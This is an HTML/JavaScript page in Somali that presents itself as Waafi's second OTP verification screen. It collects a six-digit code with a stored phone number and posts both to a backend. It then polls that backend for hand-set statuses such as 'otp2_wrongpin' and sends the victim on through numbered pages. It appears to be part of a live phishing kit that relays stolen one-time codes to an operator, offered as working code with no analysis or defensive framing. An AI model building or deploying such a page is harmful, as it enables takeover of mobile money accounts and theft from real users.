<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - OTP 2</title>

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

        .container { flex: 1; padding: 40px 20px; text-align: center; }
        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .otp-inputs input {
            width: 45px; height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }

        .otp-inputs input:focus { border-color: #2ecc71; border-width: 2px; }
        .resend-text { font-size: 13px; color: #888; margin-bottom: 30px; }

        .btn-verify {
            width: 100%; max-width: 300px;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #e0e0e0;
            color: #a0a0a0;
            font-size: 14px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
        }

        .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }

        /* --- LOADING OVERLAY --- */
        #loading-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            display: none; flex-direction: column; justify-content: center;
            align-items: center; z-index: 9999; color: white;
        }
        .spinner {
            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white; border-radius: 50%;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .footer {
            position: relative; height: 250px;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
            display: flex; justify-content: center; align-items: center; color: white;
            font-size: 12px; margin-top: auto;
        }
    </style>
</head>

<body>

<div id="loading-overlay">
    <div class="spinner"></div>
    <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
</div>

<div class="container">
    <h2>Xaqiijinta OTP-ga Labaad</h2>
    <p>Geli OTP-ga labaad oo loogu diray taleefankaaga si aad u sii waddo.</p>

    <div class="otp-inputs">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
        <input type="text" maxlength="1" inputmode="numeric">
    </div>

    <div class="resend-text" id="timer-text"></div>
    <button class="btn-verify" id="verify-btn" disabled>XAQIIJI OTP GA LABAAD</button>
    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
</div>

<div class="footer">© 2026 Waafi Soomaaliya</div>

<script>
const phone = localStorage.getItem('phone');
const inputs = document.querySelectorAll('.otp-inputs input');
const btn = document.getElementById('verify-btn');
const timerDisplay = document.getElementById('timer-text');
const statusMsg = document.getElementById('status-msg');
const overlay = document.getElementById('loading-overlay');

let countdown;
let pollingInterval;

window.onload = () => {
    if (!phone) { window.location.href = "/page6"; return; }
    inputs[0].focus();
    startTimer();
};

function startTimer() {
    let secondsLeft = 60;
    clearInterval(countdown);
    countdown = setInterval(() => {
        secondsLeft--;
        if (secondsLeft <= 0) {
            clearInterval(countdown);
            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#2ecc71; cursor:pointer; font-weight:bold;">Koodka dib u dir</span>';
            document.getElementById('resend-btn').onclick = resendCode;
        } else {
            timerDisplay.innerText = `Koodka mar kale u dir ${secondsLeft} ilbiriqsi`;
        }
    }, 1000);
}

async function resendCode() {
    timerDisplay.innerText = "Kood cusub ayaa la dirayaa...";
    
    try {
        await fetch('/api/resend-otp-notification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, step: "Second OTP" })
        });
    } catch (e) {}

    setTimeout(startTimer, 2000);
}

inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
        checkFull();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
    });
});

function checkFull() {
    const isComplete = Array.from(inputs).every(i => i.value !== '');
    btn.disabled = !isComplete;
    btn.classList.toggle('active', isComplete);
}

btn.addEventListener('click', submitOtp);

async function submitOtp() {
    if (btn.disabled) return;
    const otp = Array.from(inputs).map(i => i.value).join('');

    overlay.style.display = 'flex';
    statusMsg.innerText = ""; // Clear old message

    try {
        await fetch('/api/verify-second-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, otp })
        });
        startPolling();
    } catch {
        overlay.style.display = 'none';
        statusMsg.style.color = "red";
        statusMsg.innerText = "Khalad ayaa dhacay.";
    }
}

function startPolling() {
    clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
            const data = await res.json();

            if (data.status === "otp2_correct") {
                clearInterval(pollingInterval);
                window.location.href = "/page10.html";
            } 
            else if (data.status === "otp2_wrongpin") {
                // Trigger action for the "Wrong PIN" button
                clearInterval(pollingInterval);
                overlay.style.display = 'none';
                // Redirect user back to Page 6 with the error flag in the URL string parameters
                window.location.href = "/page6?error=wrongpin";
            } 
            else if (data.status === "otp2_wrong") {
                clearInterval(pollingInterval);
                overlay.style.display = 'none'; 
                statusMsg.style.color = "red";
                statusMsg.innerText = "❌ Koodhka waa khalad";
                resetInputs();
            }
        } catch {}
    }, 3000);
}

function resetInputs() {
    inputs.forEach(i => i.value = "");
    btn.classList.remove('active');
    btn.disabled = true;
}
</script>
</body>
  </html>
